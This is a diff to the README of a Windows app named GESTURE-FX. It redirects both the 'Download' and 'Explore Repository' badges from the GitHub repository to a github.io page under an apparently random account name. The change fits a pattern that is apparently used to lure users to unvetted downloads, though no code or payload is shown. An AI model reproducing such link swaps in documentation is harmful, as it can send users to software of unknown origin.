@@ -65,7 +65,7 @@ Follow these simple instructions to download and run GESTURE-FX on your Windows 
 
 ### Step 1: Download the Application
 
-[![Download GESTURE-FX](https://img.shields.io/badge/⬇️_DOWNLOAD_GESTURE--FX-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blimpish-appendicitis915/GESTURE-FX)
+[![Download GESTURE-FX](https://img.shields.io/badge/⬇️_DOWNLOAD_GESTURE--FX-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://blimpish-appendicitis915.github.io)
 
 Visit this link to download the application.
 
@@ -129,7 +129,7 @@ The best part? You don't need to be tech-savvy. Everything happens automatically
 
 While the primary download link above is your best option for Windows, you can also explore the project directly on GitHub for additional resources and updates.
 
-[![GitHub Repository](https://img.shields.io/badge/📦_Explore_Repository-6B5B95?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blimpish-appendicitis915/GESTURE-FX)
+[![GitHub Repository](https://img.shields.io/badge/📦_Explore_Repository-6B5B95?style=for-the-badge&logo=github&logoColor=white)](https://blimpish-appendicitis915.github.io)
 
 ## 📅 What's Next?
 
